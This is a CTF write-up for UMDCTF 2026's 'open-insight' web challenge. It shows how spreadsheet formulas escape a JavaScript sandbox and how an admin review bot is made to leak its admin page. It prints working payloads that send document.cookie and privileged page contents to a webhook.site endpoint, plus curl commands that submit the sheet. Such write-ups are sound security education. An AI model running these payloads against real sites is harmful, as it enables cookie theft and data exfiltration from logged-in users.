---
layout: post
title:  "open-insight"
date:   2026-04-28 14:10:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /UMDCTF-2026-open-insight/
---

**Category**: Web

**Author**: tahmid-23

**Description**: Share your market insights with the world. [open-insight.challs.umdctf.io](https://open-insight.challs.umdctf.io) [open-insight-bot.challs.umdctf.io](https://open-insight-bot.challs.umdctf.io)

I go to the site, then register and login (no common creds or SQLi):

![Alt text](/images/umdctf2026web2.png)

The site runs `Next.js 16.2.3`.

I create a new workbook:

![Alt text](/images/umdctf2026web3.png)

The page is a spreadsheet that evaluates formulas like `=document.title`. Everything starts with `=`. This allows arbitrary code execution inside a sandboxed environment.

I find `/admin` in the source code. 

I start testing the input. I test `=this.constructor.constructor("console.log(1337)")()` and I get `1337` in the browser console. This tells me I can execute javascript:

![Alt text](/images/umdctf2026web1.png)

After a while I find some payloads that don't return an error and don't output anything like these:
```shell
=this.constructor.constructor("return globalThis['process']")()
=this.constructor.constructor("return this.process")()
=this.constructor.constructor("return console.log((function(){return this.process}))()")()
```
I assume this is valid but the output is filtered.

Looking at the admin bot:
```shell
curl https://open-insight-bot.challs.umdctf.io/
<!doctype html>  
<html lang="en">
   <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>OpenInsight · Admin Review Queue</title>
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
      <link  
         href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT@9..144,300..800,30..100&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;60  
         0&display=swap"  
         rel="stylesheet"  
         />
   </head>
   <body>
      <header>
         <div class="inner">  
            <span style="display: flex; align-items: baseline; gap: 10px;">  
            <span class="mark" aria-hidden="true"></span>  
            <span class="display" style="font-size: 22px; font-variation-settings: 'opsz' 30, 'SOFT' 30;">  
            OpenInsight  
            </span>  
            <span class="eyebrow" style="margin-left: 4px;">· Admin Review Queue</span>  
            </span>  
            <span class="eyebrow">Internal service · Port 3001</span>  
         </div>
      </header>
      <main>
         <p class="eyebrow">Desk · Featured-consideration submissions</p>
         <h1 class="display">  
            Submit your <em>workbook</em>.  
         </h1>
         <p class="lede">  
            An OpenInsight admin will open and export your shared workbook as part  
            of our featured-consideration review. Drop your sheet id below.  
            We&rsquo;ll acknowledge immediately and hold the connection open while  
            review is in progress — typically a few seconds.  
         </p>
         <div class="meta">
            <p class="eyebrow"><span class="dot"></span>Queue live</p>
            <p class="eyebrow" style="color: var(--paper-dim);">One reviewer on duty · first-in first-out</p>
         </div>
         <form id="report-form">
            <div>  
               <label for="sheetId" class="eyebrow">Sheet id</label>  
               <input  
                  id="sheetId"  
                  name="sheetId"  
                  type="text"  
                  required  
                  autocomplete="off"  
                  autofocus  
                  placeholder="e.g. a3fx9p2bk1"  
                  />  
            </div>
            <button type="submit" id="submit-btn">Request review →</button>  
         </form>
         <div class="status" id="status" aria-live="polite">  
            <span class="line pending">Idle. Awaiting submission.</span>  
         </div>
         <p class="eyebrow" style="margin-top: 40px; color: var(--paper-faint);">  
            Sheets are opened with moderator credentials in a disposable browser  
            session. Don&rsquo;t submit anything you wouldn&rsquo;t want rendered.  
         </p>
      </main>
      <script>  
         (function () {  
         var form = document.getElementById("report-form");  
         var btn = document.getElementById("submit-btn");  
         var statusEl = document.getElementById("status");  
         var input = document.getElementById("sheetId");  
           
         form.addEventListener("submit", async function (e) {  
         e.preventDefault();  
         var sheetId = input.value.trim();  
         if (!sheetId) return;  
           
         btn.disabled = true;  
         statusEl.innerHTML = "";  
           
         var body = new URLSearchParams();  
         body.append("sheetId", sheetId);  
           
         try {  
         var res = await fetch("/report", {  
         method: "POST",  
         headers: { "Content-Type": "application/x-www-form-urlencoded" },  
         body: body.toString(),  
         });  
         if (!res.ok) {  
         var text = await res.text();  
         appendLine("err", text || ("HTTP " + res.status));  
         return;  
         }  
         if (!res.body) {  
         var text2 = await res.text();  
         appendLine("pending", text2);  
         return;  
         }  
         var reader = res.body.getReader();  
         var decoder = new TextDecoder();  
         var buf = "";  
         while (true) {  
         var chunk = await reader.read();  
         if (chunk.done) break;  
         buf += decoder.decode(chunk.value, { stream: true });  
         var lines = buf.split("\n");  
         buf = lines.pop() || "";  
         for (var i = 0; i < lines.length; i++) {  
         var line = lines[i].trim();  
         if (!line) continue;  
         var cls = /^error/i.test(line)  
         ? "err"  
         : /^done/i.test(line)  
         ? "done"  
         : "pending";  
         appendLine(cls, line);  
         }  
         }  
         if (buf.trim()) {  
         appendLine("pending", buf.trim());  
         }  
         } catch (err) {  
         appendLine("err", "Network error: " + err.message);  
         } finally {  
         btn.disabled = false;  
         }  
         });  
           
         function appendLine(cls, text) {  
         var el = document.createElement("span");  
         el.className = "line " + cls;  
         el.textContent = "› " + text;  
         statusEl.appendChild(el);  
         }  
         })();  
      </script>  
   </body>
</html>
```

I can report a sheet like this:
```shell
curl -X POST https://open-insight-bot.challs.umdctf.io/report -H "Content-Type: application/x-www-form-urlencoded" -d "sheetId=y1yuwuygu2"  
Queued. Waiting for an admin to review y1yuwuygu2...  
Done. An admin reviewed your sheet.
```

I enumerable global properties available in the JS environment with: `=this.constructor.constructor("console.log(Object.keys(globalThis))")()`

Eventually I find that this payload works:
```shell
=this.constructor.constructor(`fetch("https://webhook.site/ID?d=" + document.cookie)`)()
```
However this won't actually steal the bots cookie. 

After a lot of trial and error I send this payload:
```shell
=this.constructor.constructor(`var hook="webhook.site/5ac2cfe6-379f-4b15-bd45-be47cb19153b";function post(d){var x=new XMLHttpRequest();x.open("POST",hook,false);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.send("d="+encodeURIComponent(d));}function get(u){var x=new XMLHttpRequest();x.open("GET",u,false);x.send();return x.responseText;}post(get("/admin"));post(get("/admin/flag"));post(get("/flag"));`)()
```

I think I was having trouble before with the response length. I use synchronous `XMLHttpRequest` to fetch `/admin` (as well as `/admin/flag` and `/flag` because I wasnt 100% sure the flag was on `/admin`. I successfully got `/admin` a few times but didnt see the flag due to it being cut off) and send the full HTML to the webhook. POST avoids the URL length limits GET has. I submit my sheet containing the payload to the bot:
```shell
curl -X POST https://open-insight-bot.challs.umdctf.io/report -H "Content-Type: application/x-www-form-urlencoded" -d "sheetId=iusduh1myr"  
Queued. Waiting for an admin to review iusduh1myr...  
Done. An admin reviewed your sheet.
```

On [webhook.site](webhook.site) I get a post request from the bot containing the contents of the page:
```shell
curl -X 'POST' 'https://webhook.site/ID' -H 'accept-language: en-US,en;q=0.9' -H 'accept-encoding: gzip, deflate, br, zstd' -H 'referer: http://web:3000/' -H 'sec-fetch-dest: empty' -H 'sec-fetch-mode: cors' -H 'sec-fetch-site: cross-site' -H 'origin: http://web:3000' -H 'accept: */*' -H 'sec-ch-ua-mobile: ?0' -H 'content-type: application/x-www-form-urlencoded' -H 'sec-ch-ua: "Chromium";v="147", "Not.A/Brand";v="8"' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/147.0.0.0 Safari/537.36' -H 'sec-ch-ua-platform: "Linux"' -H 'content-length: 26783' -H 'host: webhook.site' -d $'d=%3C!

!DOCTYPE%20html%3E%3Chtml%20lang%3D%22en%22 ... url encoded page contents ...
```

Url decode and render the html:

![Alt text](/images/umdctf2026web4.png)

For some reason after I successfully got the flag I could not replicate this. The page kept saying `#ERR: A network error occurred`. Maybe this was unintended and they patched it?

`UMDCTF{r0ll_y0ur_0wn_s4nit1zat1on}`
